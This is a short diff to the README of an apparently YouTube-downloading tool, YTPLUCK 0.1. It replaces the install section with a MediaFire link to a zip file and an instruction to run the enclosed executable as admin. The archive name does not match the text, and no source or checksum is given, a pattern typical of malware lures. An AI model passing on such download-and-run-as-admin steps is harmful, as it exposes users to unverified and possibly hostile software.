@@ -43,10 +43,11 @@ So I built **YTPLUCK 0.1**, featuring:
 
 ## 📦 Installation (Developer Mode)
 
-```
 Run the ytpluck.exe directly from the link given below ..
-```
 
+https://www.mediafire.com/file/3j3x908mxd8uj5q/Ytplux.zip/file
+
+Extract the Ytpluck.zip then open that application , run as admin or just double click it .. 
 
 ## 📄 License
 
